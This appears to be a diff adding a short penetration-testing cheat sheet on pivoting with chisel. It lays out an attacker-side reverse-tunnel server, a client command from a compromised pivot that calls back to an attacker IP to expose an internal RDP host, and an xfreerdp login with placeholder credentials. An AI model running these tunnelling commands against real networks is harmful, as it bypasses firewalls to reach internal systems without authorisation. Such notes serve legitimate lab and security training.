@@ -1,0 +1,25 @@
+✅ Purpose
+
+Bypasses firewall/NAT using reverse tunnels
+
+🧠 Concept
+Attacker = server
+Pivot = client
+⚙️ Step 1: Start Server (Attacker)
+
+chisel server -p 8000 --reverse
+
+🔍 Explanation
+-p 8000 → Listening port
+--reverse → Allow reverse tunnels
+⚙️ Step 2: Connect from Pivot
+
+chisel client 10.10.10.1:8000 R:33389:192.168.1.10:3389
+
+🔍 Explanation
+R: → Reverse tunnel
+33389 → Port opened on attacker
+192.168.1.10:3389 → Internal target
+🎯 Access
+
+xfreerdp /v:127.0.0.1:33389 /u:user /p:pass
